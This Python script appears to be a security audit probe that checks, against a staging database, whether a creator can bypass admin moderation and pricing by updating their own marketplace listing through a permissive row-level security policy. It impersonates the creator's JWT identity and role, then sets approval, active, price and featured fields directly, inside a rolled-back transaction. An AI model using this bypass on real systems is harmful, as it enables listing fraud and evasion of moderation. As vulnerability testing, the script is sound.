"""Reproduce: can a creator self-approve/reprice their own listing via direct RLS,
bypassing the application's moderation and pricing workflow entirely?

`library_strategies` RLS:
    UPDATE policy "Users can update their own strategies"
        USING (author_id = auth.uid())   -- no WITH CHECK, no column restriction
    GRANT: authenticated holds UPDATE on the whole table

The application's moderation workflow (library.py `admin_moderate_strategy`,
`PATCH /admin/library/{id}`, admin-only) and the checkout/settlement path are the ONLY
places `moderation_status`, `is_active`, `price_minor`, `is_featured`, `avg_rating`,
`clone_count` are supposed to change. If RLS alone governs a direct PostgREST UPDATE,
none of that business logic runs.

This probe: seed a listing as creator A with moderation_status='pending', is_active=false,
price_minor=999999 (an absurd price), is_featured=false. Then, as creator A via
`SET LOCAL ROLE authenticated` + `auth.uid()`, attempt to UPDATE those four columns
directly. Report what succeeded.

Runs inside a transaction that is always rolled back -- no data is left behind.
"""
from __future__ import annotations

import sys
import uuid

import psycopg2

sys.path.insert(0, "staging")
from dsn import resolve_dsn  # noqa: E402


def main() -> int:
    conn = psycopg2.connect(resolve_dsn())
    conn.autocommit = False
    creator = str(uuid.uuid4())

    try:
        with conn.cursor() as cur:
            cur.execute(
                "INSERT INTO auth.users (id, email) VALUES (%s, %s)",
                (creator, f"selfapprove-{creator[:8]}@example.invalid"),
            )
            cur.execute("INSERT INTO public.profiles (id) VALUES (%s)", (creator,))

            cur.execute(
                "INSERT INTO public.library_strategies "
                "(author_id, source_strategy_id, name, category, symbol, timeframe, "
                " exchange_id, moderation_status, is_active, price_minor, is_featured) "
                "VALUES (%s, %s, 'probe-listing', 'trend', 'BTC/USDT', '1h', 'binance', "
                "        'pending', false, 999999, false) RETURNING id",
                (creator, str(uuid.uuid4())),
            )
            listing_id = cur.fetchone()[0]
            print(f"seeded listing {listing_id}: pending, inactive, price_minor=999999, "
                  f"not featured")

            # Adopt the creator's own identity, exactly as PostgREST would for a
            # directly-issued request bypassing the FastAPI app entirely.
            cur.execute("SELECT set_config('request.jwt.claim.sub', %s, true)", (creator,))
            cur.execute("SET LOCAL ROLE authenticated")

            cur.execute(
                "UPDATE public.library_strategies SET "
                "  moderation_status = 'approved', "
                "  is_active = true, "
                "  price_minor = 1, "
                "  is_featured = true "
                "WHERE id = %s",
                (listing_id,),
            )
            print(f"UPDATE statement affected {cur.rowcount} row(s)")

            cur.execute("RESET ROLE")
            cur.execute(
                "SELECT moderation_status, is_active, price_minor, is_featured "
                "FROM public.library_strategies WHERE id = %s",
                (listing_id,),
            )
            row = cur.fetchone()
            print(f"result: moderation_status={row[0]!r} is_active={row[1]} "
                  f"price_minor={row[2]} is_featured={row[3]}")

            if row == ("approved", True, 1, True):
                print()
                print("CONFIRMED: a creator can self-approve, self-activate, self-price "
                      "to 1 minor unit, and self-feature their own listing via a direct "
                      "PostgREST UPDATE, entirely bypassing admin_moderate_strategy and "
                      "every price/moderation business rule in library.py.")
                verdict = 1
            else:
                print("NOT reproduced -- the update did not fully apply")
                verdict = 0
    finally:
        conn.rollback()
        conn.close()
    return verdict


if __name__ == "__main__":
    sys.exit(main())
